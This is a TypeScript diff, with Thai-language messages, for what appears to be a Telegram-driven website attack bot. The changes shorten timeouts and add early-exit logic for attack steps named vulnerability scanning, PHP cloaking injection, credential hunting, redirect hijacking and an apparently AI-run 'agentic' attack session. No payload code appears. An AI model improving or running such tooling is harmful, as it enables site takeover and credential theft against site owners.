@@ -173,7 +173,7 @@ const recentCompletedAttacks: Array<{
   completedAt: number;
 }> = [];
 const MAX_RECENT_COMPLETED = 20;
-const ATTACK_TIMEOUT_MS = 60 * 60 * 1000; // 60 minutes — ให้โจมตีเต็มที่ user กดปุ่ม Stop ได้เอง
+const ATTACK_TIMEOUT_MS = 10 * 60 * 1000; // 10 minutes — ป้องกันค้างนาน user กดปุ่ม Stop ได้เอง
 
 function registerRunningAttack(domain: string, method: string, chatId: number, progressMsgId: number): RunningAttack {
   const id = `${domain}:${method}:${Date.now()}`;
@@ -4188,13 +4188,13 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
     
     // Update progress message
     await editTelegramMessage(config, chatId, progressMsgId,
-      `\u2694\uFE0F Attack: ${domain}\nMethod: ${method}\n\n\u23F0 \u0e2b\u0e21\u0e14\u0e40\u0e27\u0e25\u0e32 (60 \u0e19\u0e32\u0e17\u0e35) \u2014 \u0e2b\u0e22\u0e38\u0e14\u0e2d\u0e31\u0e15\u0e42\u0e19\u0e21\u0e31\u0e15\u0e34`);
+      `\u2694\uFE0F Attack: ${domain}\nMethod: ${method}\n\n\u23F0 \u0e2b\u0e21\u0e14\u0e40\u0e27\u0e25\u0e32 (10 \u0e19\u0e32\u0e17\u0e35) \u2014 \u0e2b\u0e22\u0e38\u0e14\u0e2d\u0e31\u0e15\u0e42\u0e19\u0e21\u0e31\u0e15\u0e34`);
     
     // Send timeout notification
     await sendTelegramReply(config, chatId,
       `\ud83d\udd14 \u0e2b\u0e21\u0e14\u0e40\u0e27\u0e25\u0e32\u0e42\u0e08\u0e21\u0e15\u0e35\n\n` +
       `\u23f0 ${domain} (${method})\n` +
-      `\u26a0\ufe0f \u0e43\u0e0a\u0e49\u0e40\u0e27\u0e25\u0e32\u0e40\u0e01\u0e34\u0e19 60 \u0e19\u0e32\u0e17\u0e35 \u2014 \u0e2b\u0e22\u0e38\u0e14\u0e2d\u0e31\u0e15\u0e42\u0e19\u0e21\u0e31\u0e15\u0e34\n` +
+      `\u26a0\ufe0f \u0e43\u0e0a\u0e49\u0e40\u0e27\u0e25\u0e32\u0e40\u0e01\u0e34\u0e19 10 \u0e19\u0e32\u0e17\u0e35 \u2014 \u0e2b\u0e22\u0e38\u0e14\u0e2d\u0e31\u0e15\u0e42\u0e19\u0e21\u0e31\u0e15\u0e34\n` +
       `\ud83d\udca1 \u0e25\u0e2d\u0e07\u0e43\u0e0a\u0e49\u0e27\u0e34\u0e18\u0e35\u0e2d\u0e37\u0e48\u0e19 \u0e2b\u0e23\u0e37\u0e2d\u0e2a\u0e48\u0e07 domain \u0e43\u0e2b\u0e21\u0e48\u0e44\u0e14\u0e49\u0e40\u0e25\u0e22`
     );
     
@@ -4213,7 +4213,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
     
     // Send alternatives
     await sendAlternativeAttackSuggestions(config, chatId, domain, method, {
-      errorMessage: `Timeout after 10 minutes`,
+      errorMessage: `Timeout after ${Math.round(ATTACK_TIMEOUT_MS / 60000)} minutes`,
     });
   }, ATTACK_TIMEOUT_MS);
   
@@ -4240,15 +4240,15 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
     // ═══ Shared: per-step timeout + heartbeat helper ═══
     // Use this to wrap any long-running step in any mode
     const STEP_TIMEOUTS: Record<string, number> = {
-      vulnscan: 3 * 60 * 1000,       // 3 min for vuln scan
-      redirect_takeover: 3 * 60 * 1000, // 3 min for redirect methods
-      cloaking_inject: 4 * 60 * 1000,   // 4 min for PHP injection
-      credential_hunt: 5 * 60 * 1000,   // 5 min for credential hunting
-      hijack_engine: 5 * 60 * 1000,     // 5 min for hijack engine
-      advanced_attack: 5 * 60 * 1000,   // 5 min for advanced techniques
-      agentic_session: 8 * 60 * 1000,   // 8 min for AI session
+      vulnscan: 90 * 1000,              // 1.5 min for vuln scan (reduced from 3)
+      redirect_takeover: 90 * 1000,     // 1.5 min for redirect methods (reduced from 3)
+      cloaking_inject: 2 * 60 * 1000,   // 2 min for PHP injection (reduced from 4)
+      credential_hunt: 2 * 60 * 1000,   // 2 min for credential hunting (reduced from 5)
+      hijack_engine: 2 * 60 * 1000,     // 2 min for hijack engine (reduced from 5)
+      advanced_attack: 2 * 60 * 1000,   // 2 min for advanced techniques (reduced from 5)
+      agentic_session: 4 * 60 * 1000,   // 4 min for AI session (reduced from 8)
     };
-    const DEFAULT_STEP_TIMEOUT = 3 * 60 * 1000;
+    const DEFAULT_STEP_TIMEOUT = 90 * 1000; // 1.5 min default (reduced from 3)
     
     type StepTimeoutResult<T> = { ok: true; result: T } | { ok: false; error: string; timedOut: boolean };
     
@@ -4890,14 +4890,15 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       
       // Per-method timeout settings (ms)
       const METHOD_TIMEOUTS: Record<string, number> = {
-        pipeline: 10 * 60 * 1000,      // 10 min — pipeline has many sub-methods
-        agentic_auto: 8 * 60 * 1000,   // 8 min — AI session can be long
-        hijack: 5 * 60 * 1000,         // 5 min — credential hunt + 6 methods
-        advanced: 5 * 60 * 1000,       // 5 min
-        cloaking: 3 * 60 * 1000,       // 3 min
-        redirect: 2 * 60 * 1000,       // 2 min
+        pipeline: 5 * 60 * 1000,       // 5 min — pipeline (reduced from 10)
+        agentic_auto: 4 * 60 * 1000,   // 4 min — AI session (reduced from 8)
+        hijack: 3 * 60 * 1000,         // 3 min — credential hunt + methods (reduced from 5)
+        advanced: 3 * 60 * 1000,       // 3 min (reduced from 5)
+        cloaking: 2 * 60 * 1000,       // 2 min (reduced from 3)
+        redirect: 90 * 1000,           // 1.5 min (reduced from 2)
       };
-      const DEFAULT_METHOD_TIMEOUT = 3 * 60 * 1000; // 3 min default
+      const DEFAULT_METHOD_TIMEOUT = 2 * 60 * 1000; // 2 min default (reduced from 3)
+      const MAX_CONSECUTIVE_FAILURES = 5; // Stop after 5 consecutive failures
       
       // Helper: run with per-method timeout
       const withMethodTimeout = async <T,>(methodId: string, fn: () => Promise<T>): Promise<T> => {
@@ -4957,7 +4958,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
                 enableComprehensiveAttacks: true,
                 enablePostUpload: true,
                 userId: 1,
-                globalTimeout: 8 * 60 * 1000, // 8 min — per-method timeout is 10 min
+                globalTimeout: 4 * 60 * 1000, // 4 min — per-method timeout is 5 min
               },
               async (event) => {
                 if (event.phase !== lastPhaseForProgress) {
@@ -5679,6 +5680,22 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         narrator.recordMethodResult(methodDef.name, methodDef.icon, methodSuccess);
         
         timings.push({ step: `Method ${mi + 1}: ${methodDef.name}`, ms: Date.now() - methodStart, ok: fullChainSuccess });
+        
+        // Early exit: stop if too many consecutive failures
+        if (!fullChainSuccess && failedMethods.length >= MAX_CONSECUTIVE_FAILURES) {
+          await narrator.addAnalysis(
+            `⚠️ ${failedMethods.length} วิธีล้มเหลวติดกัน — หยุดเพื่อประหยัดเวลา\n` +
+            `💡 ลองใช้วิธีเฉพาะเจาะจง เช่น hijack_redirect หรือ cloaking_inject`
+          );
+          break;
+        }
+        
+        // Early exit: check total elapsed time (safety net)
+        const totalElapsed = Date.now() - attackStartTime;
+        if (totalElapsed > ATTACK_TIMEOUT_MS - 30_000) {
+          await narrator.addAnalysis(`⏰ ใกล้หมดเวลา (${Math.round(totalElapsed / 60000)} นาที) — หยุดอัตโนมัติ`);
+          break;
+        }
       } // end for loop
       
       // ═══ AUTO-RETRY: Retry timed-out methods with extended timeout ═══
